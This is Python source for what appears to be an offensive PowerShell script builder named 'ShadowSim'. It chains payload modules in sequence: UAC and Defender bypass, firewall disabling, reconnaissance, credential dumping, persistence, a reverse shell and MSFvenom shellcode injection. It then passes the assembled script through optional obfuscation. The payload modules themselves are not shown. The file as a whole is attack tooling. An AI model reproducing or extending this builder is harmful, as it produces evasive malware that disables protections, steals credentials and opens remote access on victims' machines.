from datetime import datetime
from core.encoder import apply_obfuscation

def build_script(actions, payloads, obfuscation_method="None", delay_seconds=0):
    lines = []
    timestamp = datetime.now().isoformat()
    lines.append("# Generated by ShadowSim")
    lines.append(f"# Timestamp: {timestamp}")
    lines.append("")
    lines.append("if ($PSVersionTable.PSVersion.Major -lt 5) { exit }")
    lines.append("")

    def safe_add_payload(name, label):
        if name not in payloads:
            return

        val = payloads[name]
        lines.append(f"# --- {label} ---")
        try:
            if isinstance(val, dict):
                mod = __import__(f"payloads.{name}", fromlist=["get_payload"])
                result = mod.get_payload(**val)
            elif val is True:
                mod = __import__(f"payloads.{name}", fromlist=["get_payload"])
                result = mod.get_payload()
            elif callable(val):
                result = val()
            else:
                result = None

            if isinstance(result, list):
                lines.extend(result)
            elif result:
                lines.append(str(result))
            lines.append("")
        except Exception as e:
            lines.append(f"# Failed to include {label}: {e}")

    safe_add_payload("uac_bypass", "UAC Bypass")
    safe_add_payload("defender_bypass", "Defender Bypass")
    safe_add_payload("firewall_disable", "Firewall Disable")
    safe_add_payload("recon", "Recon")
    safe_add_payload("cred_dump", "Credential Dump")
    safe_add_payload("persistence", "Persistence Setup")

    if "reverse_shell" in payloads:
        try:
            val = payloads["reverse_shell"]
            if callable(val):
                result = val()
                if isinstance(result, list):
                    lines.append("# --- Reverse Shell ---")
                    lines.extend(result)
                    lines.append("")
                elif isinstance(result, str):
                    lines.append("# --- Reverse Shell ---")
                    lines.append(result)
                    lines.append("")
            else:
                lines.append(f"# [ERROR] reverse_shell is not callable: {val}")
        except Exception as e:
            lines.append(f"# Failed to generate reverse shell: {e}")

    if "msf_shellcode" in payloads:
        shellcode = payloads["msf_shellcode"]
        try:
            from payloads.msf_shellcode import inject_shellcode
            lines.append("# --- MSFvenom Payload ---")
            lines.extend(inject_shellcode(shellcode.strip()))
            lines.append("")
        except Exception as e:
            lines.append(f"# Failed to inject MSFvenom payload: {e}")

    if delay_seconds > 0:
        lines.append(f"Start-Sleep -Seconds {delay_seconds}")
        lines.append("")

    lines.append("# --- Simulated User Actions ---")
    seen_mouse_clicks = set()
    for action in actions:
        try:
            if action["type"] == "mouse_click":
                pos = tuple(action.get("position", (None, None)))
                if pos not in seen_mouse_clicks:
                    seen_mouse_clicks.add(pos)
                    x, y = pos
                    lines.append(f"# Mouse click at ({x},{y}) — not scriptable")
            elif action["type"] == "keystroke_sequence":
                seq = action.get("sequence", "").replace("Key.", "")
                lines.append(f"# Simulated keystroke: {seq} — not scriptable")
            elif action["type"] == "run_program":
                lines.append(f'Start-Process "{action.get("program", "unknown")}"')
            elif action["type"] == "cli_command":
                cmd = action.get("command", "")
                shell = action.get("shell", "cmd")
                if shell == "cmd":
                    lines.append(f'cmd.exe /c "{cmd}"')
                else:
                    lines.append(f'Invoke-Expression "{cmd}"')
        except Exception as e:
            lines.append(f"# Failed to process action {action}: {e}")

    return apply_obfuscation("\n".join(lines), obfuscation_method)
